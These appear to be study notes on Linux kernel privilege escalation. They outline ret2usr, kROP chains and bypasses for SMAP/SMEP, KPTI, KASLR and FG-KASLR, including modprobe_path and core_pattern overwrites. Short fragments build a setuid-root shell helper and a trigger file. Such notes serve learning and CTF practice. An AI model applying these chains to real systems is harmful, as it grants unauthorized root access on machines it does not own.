## 1. flow
- redirect control flow of kernel to a user process:
	- save userland states of registers
	- leak stack canary
	- overwrite saved rip of vuln module to userland func `privesc`
	- invoke `commit_creds(prepare_kernel_cred(0))` to LPE
	- exec `swapgs` to swap `gs` register
	- exec `iretq` to switch register context from kernel to userland and ret to spawn root shell
## 2. explanation
- to ret back to user mode from kernel mode, it needs 5 regs: ss, rsp, rflags, cs and rip. we will save user regs to kernel regs to switch back later before performing ret2usr
- call `prepare_kernel_cred(0)`. in older kernel ver, if `task_struct` arg is NULL, it will use `init_cred`, which has uid = 0 or root, so that a new cred with uid = 0 is created
	```C
	if (daemon)
		old = get_task_cred(daemon);
	else
		old = get_cred(&init_cred);
			
	validate_creds(old);
	*new = *old;
	```
- `commit_creds(cred)` assigns that root cred to cur cred
	```C
	rcu_assign_pointer(task->real_cred, new);
	rcu_assign_pointer(task->cred, new);
	```
- `swapgs` to swap kernel gs with user gs
- now push back these 5 regs on stack in order for `iretq` to pop into respective regs of user space
- after `iretq` jumping into `spawn_shell()` (rip), `getuid()` reads `current->cred->uid`, which ret 0 or root. now we have shell as root
## 3. paths
### a. no mitigations
- `save_user_state()`
- overwrite rip with `privesc()`, which includes ALL asm code to invoke `commit_creds(prepare_kernel_cred(0))` - `swapgs` - `iretq` - restore user state with `user_rip = spawn_shell()`
### b. +smap/smep
- `save_user_state()`
- kROP in `privesc()`: `pop_rdi = 0` - `prepare_kernel_cred()` - `pop_rcx = 0` - `mov rdi, rax` - `commit_creds()` - `swapgs` - `iretq` - restore user state with `user_rip = spawn_shell()`
### c. +kpti
#### trampoline: 
- `save_user_state()`
- kROP in `privesc()` same as +smap/smep, but replace `swapgs` - `iretq` with `swapgs_restore_regs_and_return_to_usermode + 22` - 0x0 - 0x0 (for pop) - restore user state with `user_rip = spawn_shell()`
#### signal handler: 
- `register_sigsegv()` with `sigact.sa_handler = spawn_shell()` - `sigemptyset(&sigact.sa_mask)` - `sigact.sa_flags = 0;` - `sigaction(SIGSEGV, &sigact, (struct sigaction*) NULL)`
- `save_user_state()`
- kROP in `privesc()` (same as +smap/smep)
- kernel will ret SIGSEGV bco kpti -> trigger shell
#### user mode helpers (umh): 
- overwrite configuration string for helper w path to evil script
- trigger helper
- run usermode program (evil script) specified by helper configuration as root
- `modprobe`:
	- `evil`: `mv /evilsu /tmp/evilsu` - `chmod u+s /tmp/evilsu` - `chmod 777 /evilsu`
	- `evilsu`: `setuid(0)` x 2 - `system("/bin/sh")`
	- `exploit`: `save_userland_state()` ; kROP: `pop_rax = "/evil` - `pop_rdi = modprobe_path` - `mov [rdi], rax` - `swapgs`/`iretq` same as +smap/smep
	- `trigger`: `fp = open("/tmp/dummy", "w")` - `fputs("\x37\x13\x42\x42", fp)` - `fclose(fp)` - `system("chmod 777 /tmp/dummy")` - `execv(dummy_file, NULL)`
	- no file found -> 
- `coredump`:
	- `evil`: same 
	- `evilsu`: same
	- `exploit`: same but replace `modprobe_path` w `core_pattern`
	- `trigger`: `char *p = 0` - `*p = 1`
	- invalid addr -> 
## d. +kaslr
- `save_user_state()`
- leak kernel base/ base offset:
	- default kernel base = 0xffffffff81000000
	- base offset = (leak & 0xffffffffffff0000) - default kernel base
	- real kernel base = default kernel base + base offset
- perform kROP in `privesc()` (same as +kpti trampoline), but gadgets + kernel base offset
- *IMPORTANT*: inspect each gadget / use another if getting error as they might change (the commands) in runtime boot
## e. +fg-kaslr
####  unaffected gadgets:
- same as umh - coredump but unafftected gadgets
#### leaking kernel symbol table
- `save_user_state()`
- after having kernel offset, leak `prepare_kernel_cred` from `ksymtab`: `pop_rax` - `mov eax, [rax]`
- `swapgs` - `iretq` to fetch `prepare_kernel_cred`: `mov fetch, eax`
- prepare_kernel_cred = fetch + kernel offset + ksymtab prepare_kernel_cred
- same path to leak `commit_creds`
- `make_cred`: `prepare_kernel_cred(0)` - `iretq` to fetch cred: `mov cred_struct_ptr, rax`
- overwrite ret